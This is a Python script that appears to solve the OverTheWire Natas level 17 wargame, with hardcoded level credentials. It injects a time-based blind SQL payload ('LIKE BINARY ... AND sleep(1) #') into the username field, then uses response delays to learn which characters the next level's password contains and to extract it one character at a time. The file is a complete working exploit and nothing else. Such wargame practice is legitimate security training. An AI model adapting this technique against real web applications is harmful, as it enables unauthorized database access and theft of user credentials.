#!/bin/python
import requests,string
from string import *

username = "natas17"
pwd = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
url = f"http://{username}.natas.labs.overthewire.org/"
fchars=''
npwd = ''
chars=ascii_lowercase+ascii_uppercase+digits

##Filters the chars present in password

for ch in chars:
	session = requests.Session()
	response= session.post(url,auth=(username,pwd),data={'username':f'Natas18"AND password LIKE BINARY "%{ch}%" AND sleep(1) #'})
	tym=response.elapsed.seconds
	if (tym >=1) :
		fchars=fchars+ch
		print(fchars)
print(f'\t\tTHE FILTERED CHARACTERS ARE :\n\t{fchars}')

##Uses Filtered chars and regex to grab the first char of password and appends that to npwd
for i in range(32):
	for ch in fchars:
		session=requests.Session()
		response2= session.post(url,auth=(username,pwd),data={'username':f'Natas18"AND password LIKE BINARY "{npwd+ch}%" AND sleep(1) #'})
		tym2=response2.elapsed.seconds
		if (tym2 >=1) :
			npwd=npwd+ch
			print(npwd)
			break
print(f'\t\tTHE PASSWORD IS :\n\t{npwd}')